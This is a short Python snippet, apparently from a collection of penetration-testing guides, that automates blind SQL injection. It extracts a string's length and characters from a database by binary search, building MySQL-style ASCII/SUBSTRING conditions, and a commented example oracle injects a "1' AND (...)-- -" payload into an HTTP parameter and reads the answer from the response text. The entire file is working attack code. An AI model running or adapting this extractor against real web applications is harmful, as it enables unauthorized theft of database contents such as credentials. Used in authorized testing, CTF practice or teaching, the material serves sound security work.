"""Snippet: binary-search blind extraction (boolean or time).

Adapt build_payload() and is_true() to the target dialect and oracle.
See guides/Blind-SQLi-Automation.md.
"""

from __future__ import annotations

from typing import Callable


def extract_char(
    ask: Callable[[str], bool],
    expr_sql: str,
    position: int,
    lo: int = 32,
    hi: int = 126,
) -> str:
    """
    ask(condition_sql) -> True if condition holds.
    expr_sql: SQL expression yielding a string (no trailing semicolon).
    """
    while lo < hi:
        mid = (lo + hi) // 2
        # MySQL-style; swap SUBSTRING/ASCII for MSSQL/Postgres as needed
        cond = f"ASCII(SUBSTRING(({expr_sql}),{position},1))>{mid}"
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def extract_string(
    ask: Callable[[str], bool],
    expr_sql: str,
    length: int,
) -> str:
    return "".join(extract_char(ask, expr_sql, i) for i in range(1, length + 1))


def extract_length(
    ask: Callable[[str], bool],
    expr_sql: str,
    max_len: int = 64,
) -> int:
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"LENGTH(({expr_sql}))>{mid}"
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    return lo


# Example oracle wiring (boolean):
# def ask(cond: str) -> bool:
#     payload = f"1' AND ({cond})-- -"
#     r = session.get(url, params={"id": payload})
#     return "Welcome" in r.text
